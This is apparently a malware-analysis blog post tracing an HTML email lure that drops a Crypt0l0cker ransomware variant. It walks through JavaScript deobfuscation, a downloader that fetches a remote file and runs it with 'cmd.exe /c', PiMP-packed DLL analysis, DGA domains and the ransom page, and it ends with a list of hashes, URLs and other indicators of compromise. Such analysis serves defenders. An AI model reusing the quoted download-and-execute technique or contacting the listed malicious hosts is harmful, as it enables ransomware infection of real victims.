@@ -1,0 +1,335 @@
+
+Crypt0l0cker Revival !
+
+
+
+A couple of days ago a colleague of mine gave me a "brand new" malicious content delivered by a single HTML page. The page was sent to an email box as part of a biggest attack. I found that vector particularly fun and so I'd like to share some of the steps who took me through a personal investigation path made not for professional usage but just for fun.
+
+At first sight the HTML page looks like the following image.
+
+
+
+
+Figure1: Attack Vector. A simple HTML page
+
+
+
+A white backgrounded HTML page with a single line test on it saying: "print this document please". But what document ? Honestly I am in front of one of the ugliest "fake email" I ever seen. But let's move on and se what it really carries on. Opening the HTML content with a simple editor we might see a suspicious obfuscated Javascript. We are facing a first obfuscation stage. 
+
+
+
+
+Figure2: Obfuscated First Stage
+
+
+
+
+Since Javascript is an interpreted language (such as .NET or .Java) is not hard to understand its behavior, indeed after some rounds of "substitutions" and "concatenations" it easy to get the following clear text result showing the end of the first stage.
+
+
+
+
+Figure3: Clear Text First Stage
+
+
+That script is going to create an additional "script tag" on the current document by injecting an external script from: "https://s3-us-west-2.amazonaws.com/s.cdpn.io/14082/FileSaver.js". The injected script will be called with the following code signature: "saveAs(blob, 'image.js');" with 2 arguments: 
+
+
+
+blob. The raw content of "big_encoded_data" (please refer to Figure3)
+image.js. The saving name
+
+
+In order to better understand what that function saveAs(blob, image.js) does we need to analyze the external FileServer.js. The entry point of the external script is the function "saveAs(arg1, arg2)" which has been defined as follows:
+
+
+
+
+Figure4: FileServer.js Original Entry
+
+
+
+
+
+saveAs(blob, name) is a simple wrapper function headed to FileServer constructor which is defined as follows:
+
+
+
+
+Figure5: FileServer.js constructor
+
+
+
+
+The script saves the "blob" content to the temporary folder giving to it a specific name (image.js in our case). As you might notice from the script content: "Apple do not allow window.open, see http://bit.ly/1kZffRI " if the victims opens the file with Safari/Mail the attack vector will have no effect since Safari/Mail does not allow you to trigger the script on "window.open" event. This is why I did't see any file when I opened the infected HTML content. Back to the original script (Figure3) we see the aveAs function called on page.load so the resulting image.js is going to be saved in the temporary local folder, in case of email clients, it will be triggered as soon as saved! So lets move on our next stage: the big_encoded_data variable (Figure3) which is going to be saved as image.js file. The big_encoded_data owns a first obfuscation stage made by encoding the downloader in base64. Once decoded from base64 and beautified the results looks like the following image
+
+
+
+
+Figure6: Stage 2 base64 decoded obfuscated downloader
+
+
+
+
+The downloader is still obfuscated by a high number of simple returning array-strings variables. It took almost 45 minutes to decode the entire second stage downloader. The resulting downloader is shown in the following image.
+
+
+
+
+Figure7: Second Stage Downloader
+
+
+A first check on fileSystem API and on the Element Type is super interesting (at least to me). We are analyzing an attack based on a specific file system, Windows native. The deobfuscated downloader grabs a file from  "http://mit.fileserver4390.org/file/nost.bgt" and saves it to a temporary directory. By using ActiveXObject (Windows native) it saves the file and it runs it through command line c["run"]("cmd.exe /c " + f + g, "0"); where f takes the temporary folder f = b["GetSpecialFolder"]("2"); and g takes the temporary name g = b["GetTempName"]();.
+
+
+
+This is the end of the second stage downloader. 
+
+
+
+The downloaded file is a PE Executable packed as well. Fortunately the used packer is the PiMP Stub by Nullsoft: a quite famous installer used by several software house. 
+
+
+
+
+Figure8: NullSoft Installer
+
+
+
+
+The PiMP installer takes .dlls and runs them as the resulting software. The used resources are compressed in its own body by a well known algorithm: .7zip. Kation.DLL is the only DLL included in the dropped file and so it is the run DLL by PiMP installer. Kation wraps out ADVAPI32.DLL and KERNEL32.DLL as you might see from Figure9. ADVAPI32 is a core Microsoft library which includes the Microsoft encryption libraries such as: EncryptFileA, EncryptFileW and so on and so forth. It's not hard to guess a new Ransomware infection from that API calls.
+
+
+
+
+Figure9: Usage of Encryption Libraries
+
+
+
+
+From a static analysis prospective it becomes clear that some of the used strings are dynamically allocated. For example in sub_10001170 (frame 0XBC) several UFT-16 strings within decryption loop are involved showing out the control flow passing to Etymology.Vs (Figure11).
+
+
+
+
+Figure10: Setting the running pointer
+
+
+
+
+
+Figure11: Decoding Functions
+
+
+
+
+The real behavior is hidden into the Etymology.Vs encrypted file included in the PiMP solution as well. Running the infected sample it disclosures its real behavior: shown in Figure12.
+
+
+
+
+Figure12: Ransom Request
+
+
+
+
+Here we go,  we have just discovered a brand new Crypt0L0cker ! it asks for bitcoin (Figure13), of course.  Looking at network communications, a Domain Name Generator Algorithm (DNGA), [wow, it sounds new from CryptoL0Cker !] fires up as soon as the dropped file is executed. It looks for valid registered subdomains belonging with divamind.org.  Until a valid Command and Control answers to the CryptoLocker client it hides itself and performs simple DNS query as follows:
+
+
+
+ 28  imadyxaro.divamind.org 
+
+ 29  irel.divamind.org 
+
+ 30  awwtodufir.divamind.org 
+
+ 31  ogisirigu.divamind.org 
+
+ 32  yzijyvy.divamind.org 
+
+ 33  uqekfr.divamind.org 
+
+ 34  ydoc.divamind.org 
+
+ 35  yzukyfyku.divamind.org 
+
+ 36  upenigy.divamind.org 
+
+ 37  qhera.divamind.org 
+
+ 38  ijywiqezy.divamind.org 
+
+ 39  efuca.divamind.org 
+
+ 40  ygbm.divamind.org 
+
+ 41  ejrdip.divamind.org 
+
+ 42  usen.divamind.org 
+
+ 43  ahydenuj.divamind.org 
+
+ 44  ghxsykegaja.divamind.org 
+
+ 45  ekohob.divamind.org 
+
+ 46  ifyvas.divamind.org 
+
+ 47  iqimub.divamind.org 
+
+ 48  usegi.divamind.org 
+
+ 49  yjeqicoht.divamind.org 
+
+ 50  rtibola.divamind.org 
+
+ 51  ucnpive.divamind.org 
+
+ 52  aminevkjude.divamind.org 
+
+ 53  pwiregaty.divamind.org 
+
+ 54  irol.divamind.org 
+
+ 55  abswuhupnt.divamind.org 
+
+ 56  erelo.divamind.org 
+
+ 57  ulefuw.divamind.org 
+
+ 58  ogax.divamind.org 
+
+ 59  ezelilijxn.divamind.org 
+
+ 60  ulymobutol.divamind.org 
+
+ 61  obehilebac.divamind.org 
+
+ 62  yfycodolul.divamind.org 
+
+ 63  iwesvxynd.divamind.org 
+
+ 64  kcoma.divamind.org 
+
+ 65  ydqpibc.divamind.org 
+
+ 66  ykotifehut.divamind.org 
+
+ 67  ewuzivy.divamind.org 
+
+ 68  imocyfyt.divamind.org 
+
+ 69  fjep.divamind.org 
+
+ 70  ibeb.divamind.org 
+
+ 71  isafexuh.divamind.org 
+
+ 72  izemireli.divamind.org 
+
+ 73  kgorihukyho.divamind.org 
+
+ 74  udupose.divamind.org 
+
+
+
+p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px 'Andale Mono'; color: #28fe14; background-color: #000000; background-color: rgba(0, 0, 0, 0.9)}
+span.s1 {font-variant-ligatures: no-common-ligatures; color: #ecec15}
+span.s2 {font-variant-ligatures: no-common-ligatures}
+
+
+
+ 75  iqyk.divamind.org 
+
+
+
+The process to contact the Command and Control in order to exchange key and to notify the attacker could be very time consuming, in some of my runs it took until 2 hours depending on the available Command and Control at the time being. It would be very nice to have extra time to reverse the DNGA but unfortunately my weekend time is ending up. 
+
+
+
+
+
+
+Figure13: Ransom Request Web Page
+
+
+
+
+Development language is French, and many piece of code reminds me the "gaming world".   The main Command and Control domain is registered in Moscow (RU) and the registrant is "privacy protected".
+
+
+
+Results for Target: divamind.org
+
+
+
+
+
+
+Created Date :2017-02-07T12:37:10Z
+Updated Date :2017-02-08T10:38:54Z
+WHOIS Server:whois.pir.org
+
+
+
+Results for Target: divamind.org
+
+
+
+
+
+
+Created Date :2017-02-07T12:37:10Z
+Updated Date :2017-02-08T10:38:54Z
+WHOIS Server:whois.pir.org
+
+
+
+
+
+The ransom page (available on the following link) is registered by EPAG Domain Sercives GmbH (Bonn, Germany) and is written in Franc language: 
+
+
+
+http://x5sbb5gesp6kzwsh.hoptrop.pl/uum2j9ku.php?user_code=&user_pass=&page_id=0
+
+
+
+
+
+Ok Let's have some brand new IoC:
+
+
+
+Malicious hashes:
+
+2649cba6ca799e15c45fa59472031cc9087a5ade
+
+6ef0e56b27cfd3173aeded9be9d05e97d8e36da3
+
+7292f20a0909f5f9429d5c1ec2896cf8f57a40a2
+
+0b7b7201310638a74dba763c228d8afe77303802
+
+2d36b1bf1c37d6f5b47fe36bd2c5bac81b517774
+
+
+
+Malicious urls:
+http://mit.fileserver4390.org/file/nost.bg
+
+http://x5sbb5gesp6kzwsh.hoptrop.pl
+http://xiodc6dmizahhijj.onion
+
+DNGA:
+- base dns: XXXXXXX.divamind.org
+
+Extension:
+.?????? (6 characters)
+
+Strings:
+HOW_TO_RESTORE_FILES
+
+Enjoy your new IoC
+
+
